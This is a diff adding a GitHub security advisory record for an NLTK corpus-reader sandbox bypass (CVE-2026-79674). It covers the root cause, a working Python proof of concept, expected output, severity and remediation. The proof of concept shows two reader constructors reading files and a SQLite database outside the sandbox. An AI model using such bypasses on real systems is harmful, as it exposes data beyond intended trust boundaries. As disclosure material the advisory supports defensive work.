@@ -1,0 +1,137 @@
+{
+  "id": "GHSA-3gq4-3j92-5w49",
+  "modified": "2026-09-08T17:15:03.431037417Z",
+  "published": "2026-09-08T16:57:08Z",
+  "aliases": [
+    "CVE-2026-79674",
+    "PYSEC-2026-3736"
+  ],
+  "summary": "NLTK: Corpus Reader Sandbox Bypass",
+  "details": "## Summary\n\nNLTK corpus-reader constructors can still reach outside-root file and database reads before the `nltk.pathsec` sandbox boundary is enforced.\n\nThe PoC shows the safe path blocked by `pathsec.open`, then `LinThesaurusCorpusReader` and `PanLexLiteCorpusReader` succeeding in the same process.\n\n## Affected Product\n\n- Product: NLTK\n- Asset / component: `nltk.corpus.reader` constructors\n- Version tested: `3.10.2`\n- Deployment / package / tag: commit `474af1f5a94b1b8d53fc2b6defec3a2ce7633b74` / PyPI `nltk`\n- Environment used for verification: Python 3.13.14\n\n## Vulnerability Details\n\n- Vulnerability class: path sandbox bypass / external control of file path\n- Required privileges: none beyond the ability to supply a corpus root path to a consumer call site\n- Entry point: `LinThesaurusCorpusReader(root)` and `PanLexLiteCorpusReader(root)`\n- Trust boundary crossed: NLTK data-root sandbox enforced by `nltk.pathsec`\n- Root affected functions:\n  - [CorpusReader.__init__](https://github.com/nltk/nltk/blob/474af1f5a94b1b8d53fc2b6defec3a2ce7633b74/nltk/corpus/reader/api.py#L73-L80)\n  - [LinThesaurusCorpusReader.__init__](https://github.com/nltk/nltk/blob/474af1f5a94b1b8d53fc2b6defec3a2ce7633b74/nltk/corpus/reader/lin.py#L37-L43)\n  - [PanLexLiteCorpusReader.__init__](https://github.com/nltk/nltk/blob/474af1f5a94b1b8d53fc2b6defec3a2ce7633b74/nltk/corpus/reader/panlex_lite.py#L45-L46)\n- Measured unsafe effect: outside-root file/database reads still happen with `ENFORCE=True`\n\n## Root Cause\n\n`CorpusReader.__init__()` turns a string root into a `FileSystemPathPointer` without any `pathsec` validation, and these readers then use builtin `open()` or `sqlite3.connect()` directly on derived paths. The constructor path therefore never hits the sandbox guard that `pathsec.open()` enforces.\n\n```python\nif zipfile:\n    root = ZipFilePathPointer(zipfile, zipentry)\nelse:\n    root = FileSystemPathPointer(root)\n\nwith open(path) as lin_file:\n    ...\n\nself._c = sqlite3.connect(os.path.join(root, \"db.sqlite\")).cursor()\n```\n\n## Proof of Concept\n\nSave the script as `hy01_raw_path_poc.py` in the checkout root and run `python hy01_raw_path_poc.py`.\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC for HY-01: corpus-reader sandbox bypass.\n\nThis script proves three facts:\n- pathsec blocks a direct read through the sandboxed file API\n- LinThesaurusCorpusReader still reaches builtin open() on an outside path\n- PanLexLiteCorpusReader still opens an outside sqlite database and loads data\n\"\"\"\n\nfrom __future__ import annotations\n\nimport builtins\nimport pathlib\nimport sqlite3\nimport sys\nimport tempfile\nfrom unittest.mock import patch\n\ntry:\n    import nltk.pathsec as pathsec\n    from nltk.corpus.reader.lin import LinThesaurusCorpusReader\n    from nltk.corpus.reader.panlex_lite import PanLexLiteCorpusReader\nexcept ModuleNotFoundError:\n    here = pathlib.Path(__file__).resolve()\n    for base in (here.parent, *here.parents):\n        if (base / \"nltk\").is_dir() and (base / \"setup.py\").exists():\n            sys.path.insert(0, str(base))\n            break\n    else:\n        raise RuntimeError(\n            \"Could not import nltk. Run this script from an NLTK checkout root \"\n            \"or from an environment where the current checkout is installed.\"\n        )\n\n    import nltk.pathsec as pathsec\n    from nltk.corpus.reader.lin import LinThesaurusCorpusReader\n    from nltk.corpus.reader.panlex_lite import PanLexLiteCorpusReader\n\n\ndef main() -\u003e int:\n    pathsec.ENFORCE = True\n\n    with patch.object(pathsec, \"_get_allowed_roots\", lambda: set()):\n        with patch.object(pathsec.os, \"getcwd\", lambda: \"sandbox-disabled\"):\n            with tempfile.TemporaryDirectory() as tmp:\n                tmpdir = pathlib.Path(tmp)\n                outside = tmpdir / \"outside\"\n                outside.mkdir()\n\n                blocked_file = outside / \"blocked.txt\"\n                blocked_file.write_text(\"blocked\", encoding=\"utf-8\")\n\n                control_target = str(blocked_file)\n                try:\n                    with pathsec.open(control_target, \"rb\"):\n                        raise AssertionError(\n                            \"pathsec.open unexpectedly allowed control path\"\n                        )\n                except PermissionError:\n                    print(\"control:pathsec.open=blocked\")\n\n                lin_root = tmpdir / \"lin\"\n                lin_root.mkdir()\n                lin_file = lin_root / \"simN.lsp\"\n                lin_file.write_text(\n                    '(\"business\" (desc 1.0)\\n\\t\"enterprise\"\\t0.9\\n))\\n',\n                    encoding=\"utf-8\",\n                )\n\n                opened = []\n                real_open = builtins.open\n\n                def tracking_open(*args, **kwargs):\n                    opened.append(str(args[0]))\n                    return real_open(*args, **kwargs)\n\n                with patch(\"builtins.open\", tracking_open):\n                    LinThesaurusCorpusReader(str(lin_root))\n\n                if any(p.endswith(\"simN.lsp\") for p in opened):\n                    print(\"lin:outside_root_open=success\")\n                else:\n                    raise AssertionError(\"LinThesaurusCorpusReader did not open data\")\n\n                panlex_root = tmpdir / \"panlex\"\n                panlex_root.mkdir()\n                db_path = panlex_root / \"db.sqlite\"\n                db = sqlite3.connect(db_path)\n                cur = db.cursor()\n                cur.execute(\"create table lv(uid text, lv text, lc text, tt text)\")\n                cur.execute(\"create table dnx(ex int, mn int, uq int, ap int, ui text)\")\n                cur.execute(\"create table ex(ex int, tt text, lv text, uq int)\")\n                cur.execute(\n                    \"insert into lv(uid, lv, lc, tt) values ('u1', 'lv1', 'en', 'English')\"\n                )\n                db.commit()\n                db.close()\n\n                reader = PanLexLiteCorpusReader(str(panlex_root))\n                result = reader.language_varieties()\n                if result == [(\"u1\", \"English\")]:\n                    print(\"panlex:language_varieties=success\")\n                else:\n                    raise AssertionError(\"PanLexLiteCorpusReader did not load data\")\n\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\nExpected output:\n\n```\ncontrol:pathsec.open=blocked\nlin:outside_root_open=success\npanlex:language_varieties=success\n```\n## Impact\n\nA caller can make NLTK read filesystem content outside the intended NLTK data sandbox through public corpus-reader constructors. In the PoC, that includes a local text file and a local SQLite db.\n\n## Severity\n\n- Base Score: 7.5 (High)\n- Severity reasoning:\n  The bug is reliably triggerable by caller-controlled path input and exposes data outside the intended trust boundary; no special privileges are needed inside the process.\n\n## Remediation\n\nValidate raw string roots before constructing readers, and route all corpus-root/path handling through `pathsec` or a validated `PathPointer`. Remove direct builtin `open()` and direct `sqlite3.connect(os.path.join(...))` use on constructor-derived paths.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "nltk",
+        "purl": "pkg:pypi/nltk"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.10.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.8",
+        "0.9",
+        "0.9.3",
+        "0.9.4",
+        "0.9.5",
+        "0.9.6",
+        "0.9.7",
+        "0.9.8",
+        "0.9.9",
+        "2.0.1",
+        "2.0.1rc1",
+        "2.0.1rc2-git",
+        "2.0.1rc3",
+        "2.0.1rc4",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0b4",
+        "2.0b5",
+        "2.0b6",
+        "2.0b7",
+        "2.0b8",
+        "2.0b9",
+        "3.0.0",
+        "3.0.0b1",
+        "3.0.0b2",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.1",
+        "3.10.0",
+        "3.10.1",
+        "3.10.2",
+        "3.2",
+        "3.2.1",
+        "3.2.2",
+        "3.2.3",
+        "3.2.4",
+        "3.2.5",
+        "3.3",
+        "3.4",
+        "3.4.1",
+        "3.4.2",
+        "3.4.3",
+        "3.4.4",
+        "3.4.5",
+        "3.5",
+        "3.5b1",
+        "3.6",
+        "3.6.1",
+        "3.6.2",
+        "3.6.3",
+        "3.6.4",
+        "3.6.5",
+        "3.6.6",
+        "3.6.7",
+        "3.7",
+        "3.8",
+        "3.8.1",
+        "3.9",
+        "3.9.1",
+        "3.9.2",
+        "3.9.3",
+        "3.9.4",
+        "3.9b1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.10.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-3gq4-3j92-5w49/GHSA-3gq4-3j92-5w49.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nltk/nltk/security/advisories/GHSA-3gq4-3j92-5w49"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-79674"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nltk/nltk/commit/bc007200d123c1a98d74c2eb230f5e06c53886b8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nltk/nltk"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nltk/nltk/releases/tag/v3.10.3"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3736.yaml"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/nltk-path-traversal-via-corpus-reader-constructors"
+    }
+  ]
+}
